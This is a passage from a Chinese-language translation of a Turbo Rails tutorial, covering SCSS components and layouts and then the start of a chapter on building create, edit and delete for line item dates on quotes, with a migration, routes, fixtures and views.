  <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token selector">&amp;__group</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__input</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">max-width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxs<span class="token punctuation">)</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">outline</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token property">transition</span><span class="token punctuation">:</span> box-shadow 250ms<span class="token punctuation">;</span>

    <span class="token selector">&amp;:focus</span> <span class="token punctuation">&#123;</span>
      <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 2px <span class="token function">var</span><span class="token punctuation">(</span>--color-glint<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">&amp;--invalid</span> <span class="token punctuation">&#123;</span>
      <span class="token property">border-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下来是<code>.visually-hidden component</code></p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_visually_hidden.scss

// Shamelessly stolen from Bootstrap

.visually-hidden</span> <span class="token punctuation">&#123;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 1px <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 1px <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 0 <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> -1px <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">clip</span><span class="token punctuation">:</span> <span class="token function">rect</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">)</span> <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">white-space</span><span class="token punctuation">:</span> nowrap <span class="token important">!important</span><span class="token punctuation">;</span>
  <span class="token property">border</span><span class="token punctuation">:</span> 0 <span class="token important">!important</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>展示异常信息</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_error_message.scss

.error-message</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary-bg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>That’s it; we have all the components we need to complete the CRUD on our Quote model. We just need two layouts now, and we will be done with the CSS!</p>
<h3 id="The-layouts-folder"><a href="#The-layouts-folder" class="headerlink" title="The layouts folder"></a>The layouts folder</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/layouts/_container.scss

.container</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token property">padding-right</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding-left</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-left</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
  <span class="token property">margin-right</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>

  <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    <span class="token property">padding-right</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">padding-left</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">max-width</span><span class="token punctuation">:</span> 60rem<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">// app/assets/stylesheets/layouts/_header.scss

.header</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">flex-wrap</span><span class="token punctuation">:</span> wrap<span class="token punctuation">;</span>
  <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>
  <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-l<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>好了这些就是所有内容，现在我们导入到 manifest file 为了 Sass 去处理他们</p>
<h3 id="The-manifest-file"><a href="#The-manifest-file" class="headerlink" title="The manifest file"></a>The manifest file</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// Mixins
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"mixins/media"</span><span class="token punctuation">;</span></span>

// Configuration
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"config/variables"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"config/reset"</span><span class="token punctuation">;</span></span>

// Components
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/btn"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/error_message"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/form"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/visually_hidden"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/quote"</span><span class="token punctuation">;</span></span>

// Layouts
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"layouts/container"</span><span class="token punctuation">;</span></span>
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"layouts/header"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>赶紧结束吧，我们已经写了太多让人头晕的css代码了。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第九章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%B9%9D%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Another-CRUD-controller-with-Turbo-Rails"><a href="#Another-CRUD-controller-with-Turbo-Rails" class="headerlink" title="Another CRUD controller with Turbo Rails"></a>Another CRUD controller with Turbo Rails</h1><p>本章节中，我们将构建quotes中的日期数据的增删改查，这是一个很好的机会去练习我们之前学习的内容。</p>
<h2 id="What-we-will-build-in-the-following-three-chapters"><a href="#What-we-will-build-in-the-following-three-chapters" class="headerlink" title="What we will build in the following three chapters"></a>What we will build in the following three chapters</h2><p>现在用户可以创建，修改，删除quotes数据，是时候让我们的quotes编辑器做一些更有用的事儿。</p>
<p>接下来三章，我们将在<code>Quotes#show</code>页面中构建，当本章结束时，我们的用户可以为每个quotes添加多个日期，而每个日期里有多个条目，每个条目拥有名称，可选的描述信息，数量，单价。</p>
<p>在动手之前，我们可以再在线上实例中体验一下：<a href="https://www.hotrails.dev/quotes">quote editor on hotrails.dev</a>，创建一个quote，进入<code>Quotes#show</code>页面，我们可以创建多个日期，并在日期里添加多个条目，当我们创建，修改，删除条目时，quote的总额也会被更新。</p>
<h2 id="What-we-will-build-in-this-chapter"><a href="#What-we-will-build-in-this-chapter" class="headerlink" title="What we will build in this chapter"></a>What we will build in this chapter</h2><p>我们还是在不使用Turbo Frames和Turbo Streams的前提下构建日期数据的增删改查，因为我们需要我们的控制器在进行任何改进之前先能正常工作</p>
<p>让我们画一个草图，当我们访问<code>Quotes#show</code>也页面时,我们应该能看到该条quote的日期数据</p>
<p><img src="../../../../public/img/image-20230625150959205.png" alt="image-20230625150959205"></p>
<p>当我们不使用<code>Turbo</code>构建增删改查前，点击<code>New date</code>链接时，会带我们到<code>LineItemDates#new</code>页面</p>
<p><img src="../../../../public/img/image-20230625151127303.png" alt="image-20230625151127303"></p>
<p>当我们提交一个可用数据时，就被重定向到<code>Quotes#show</code>页面，展示新建的数据，而日期数据应该是正序排序好的</p>
<p><img src="../../../../public/img/image-20230625151311024.png" alt="image-20230625151311024"></p>
<p>如果我们决定修改刚刚创建的数据时，我们可以点击<code>Edit</code>链接，跳转到<code>LineItemDates#edit</code>页面</p>
<p><img src="../../../../public/img/image-20230625151425060.png" alt="image-20230625151425060"></p>
<p>如果我们提交的是可用数据，则又被重定向到<code>Quotes#show</code>页面中，其中被修改的数据在页面中也更新了。并且数据仍然保证排序</p>
<p><img src="../../../../public/img/image-20230625151552377.png" alt="image-20230625151552377"></p>
<p>最后当我们想删除数据时，点击<code>Delete</code>链接，数据也就从列表中移除了。</p>
<p>现在需求被明确了，来敲代码吧。</p>
<h2 id="Creating-the-model"><a href="#Creating-the-model" class="headerlink" title="Creating the model"></a>Creating the model</h2><p>让我们创建<code>LineItemDate</code>模型，拥有日期字段，并包含所属的quote_id字段，每个line item date属于一条quote，而一个quote可以拥有多个line item date。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate model LineItemDate quote:references date:date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在执行<code>rails db:migrate</code>指令前，我们必须给迁移文件添加一些约定</p>
<ul>
<li>每条<code>LineItemDate</code>的日期字段必须非空，我们会在模型中加入一些校验。</li>
<li>我们希望同一时间一个quote中应该只有一个唯一时间数据，我在数据库层面去控制它，所以会对<code>quote_id and date</code>加入唯一索引</li>
<li>由于我们会对line item date进行排序，为了性能优化，我们也会加上索引。</li>
</ul>
<p>最终的迁移文件会是这样的：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># db/migrate/XXXXXXXXXXXXXX_create_line_item_dates.rb</span>

<span class="token keyword">class</span> <span class="token class-name">CreateLineItemDates</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Migration<span class="token punctuation">[</span><span class="token number">7.0</span><span class="token punctuation">]</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">change</span></span>
    create_table <span class="token symbol">:line_item_dates</span> <span class="token keyword">do</span> <span class="token operator">|</span>t<span class="token operator">|</span>
      t<span class="token punctuation">.</span>references <span class="token symbol">:quote</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token symbol">foreign_key</span><span class="token operator">:</span> <span class="token boolean">true</span>
      <span class="token comment"># Adding null: false constraint on date</span>
      t<span class="token punctuation">.</span>date <span class="token symbol">:date</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>

      t<span class="token punctuation">.</span>timestamps
    <span class="token keyword">end</span>

    <span class="token comment"># Adding uniqueness constraint for the couple date and quote_id</span>
    add_index <span class="token symbol">:line_item_dates</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token symbol">:date</span><span class="token punctuation">,</span> <span class="token symbol">:quote_id</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token symbol">unique</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token comment"># Adding index to the date field for performance reasons</span>
    add_index <span class="token symbol">:line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">:date</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行迁移命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>添加关联关系到<code>LineItemDate</code>模型中，和排序</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/line_item_date.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDate</span> <span class="token operator">&lt;</span> ApplicationRecord
  belongs_to <span class="token symbol">:quote</span>

  validates <span class="token symbol">:date</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token symbol">uniqueness</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">scope</span><span class="token operator">:</span> <span class="token symbol">:quote_id</span> <span class="token punctuation">&#125;</span>

  scope <span class="token symbol">:ordered</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> order<span class="token punctuation">(</span><span class="token symbol">date</span><span class="token operator">:</span> <span class="token symbol">:asc</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>每一天line item date都是非空的，使用<code>presence:true&quot;</code></li>
<li>一个quote不会有相同的两个date，使用<code>uniqueness: &#123;scope: :quote_id&#125;</code></li>
</ul>
<p>再到<code>Quote</code>模型中加入关联关系</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  has_many <span class="token symbol">:line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">dependent</span><span class="token operator">:</span> <span class="token symbol">:destroy</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们模型层面就完成了，下面我们再完善路由</p>
<h2 id="Adding-routes-for-line-item-dates"><a href="#Adding-routes-for-line-item-dates" class="headerlink" title="Adding routes for line item dates"></a>Adding routes for line item dates</h2><p>我们想要执行<code>LineItemDate</code>模型中增删改查中的七个actions，除了下面的两个：</p>
<ul>
<li>我们不需要<code>LineItemDates#index</code>action，因为所有的数据已经在<code>Quotes#show</code>页面中展示了</li>
<li>我们也不需要<code>LineItemDates#show</code>action，因为展示单条line item date没啥意义。我们需要看quote中所有的数据</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/routes.rb</span>

Rails<span class="token punctuation">.</span>application<span class="token punctuation">.</span>routes<span class="token punctuation">.</span>draw <span class="token keyword">do</span>
  <span class="token comment"># All the previous routes</span>

  resources <span class="token symbol">:quotes</span> <span class="token keyword">do</span>
    resources <span class="token symbol">:line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">except</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:index</span><span class="token punctuation">,</span> <span class="token symbol">:show</span><span class="token punctuation">]</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们使用restful resources，看起来很简洁。下一部分，我们会添加一些假的数据给fixtures。</p>
<h2 id="Designing-line-item-dates"><a href="#Designing-line-item-dates" class="headerlink" title="Designing line item dates"></a>Designing line item dates</h2><p><code>Quotes#show</code>页面现在是空的，当我们添加点儿假数据</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/line_item_dates.yml</span>

<span class="token key atrule">today</span><span class="token punctuation">:</span>
  <span class="token key atrule">quote</span><span class="token punctuation">:</span> first
  <span class="token key atrule">date</span><span class="token punctuation">:</span> &lt;%= Date.current %<span class="token punctuation">></span>

<span class="token key atrule">next_week</span><span class="token punctuation">:</span>
  <span class="token key atrule">quote</span><span class="token punctuation">:</span> first
  <span class="token key atrule">date</span><span class="token punctuation">:</span> &lt;%= Date.current + 1.week %<span class="token punctuation">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行<code>bin/rails db:seed</code>指令后，数据就添加到了数据库，现在打开系统中第一条quote的<code>Quotes#show</code>页面，现在的页面是这样的：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quotes"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quotes_path <span class="token string-literal"><span class="token string">%>
  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/h1></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了匹配我们的草图， 我们需要一个跳转到<code>LineItemDates#new</code>页面的链接，并且需要渲染line item dates集合。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quotes"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quotes_path <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/h1></span></span>

    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"New date"</span></span><span class="token punctuation">,</span>
                new_quote_line_item_date_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去渲染line item dates集合，我们首先应该返回所有的line items在<code>QuotesController#show</code>action中</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">show</span></span>
    <span class="token variable">@line_item_dates</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>ordered
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来我们为单个line item date创建html</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/line_item_dates/_line_item_date.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>line-item-date<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>line-item-date__header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>line-item-date__title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= l(line_item_date.date, format: :long) %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>line-item-date__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    [quote, line_item_date],
                    method: :delete,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  [:edit, quote, line_item_date],
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大多数的标签都被嵌套到class为的<code>.line-item-date_header</code>的div标签中，这是因为我们会在下一章中写<code>.line-item-date_body</code>和<code>.line-item-date_footer</code>类，其中将会包含quote中的所有line items和新建line item的链接。为了减少这里要写的CSS/HTML数量，我们之后再处理这里。</p>
<hr>
<p><strong>注意：</strong>我为了更好的可读性，这里使用了不同的路由形式，本教程中我想要让代码更短小一些，如果你还不太熟悉多样的路由形式，下面的两行代码是相同的（但第二种明显更长）</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span> <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">]</span> <span class="token string-literal"><span class="token string">%>
&lt;%= button_to "Delete", quote_line_item_date_path(quote, line_item_date) %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在Controllers中也可以这么使用，比如下面的代码就是等价的</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">redirect_to <span class="token variable">@quote</span>
redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果你想了解更多内容，看看文档：<a href="https://api.rubyonrails.org/classes/ActionDispatch/Routing/PolymorphicRoutes.html">the documentation</a></p>
<hr>
<p>现在我们已经定义了HTML标签，让我们添加点儿样式吧</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_line_item_date.scss

.line-item-date</span> <span class="token punctuation">&#123;</span>
  <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxs<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token selector">&amp;__header</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>
    <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__title</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xxl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__actions</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
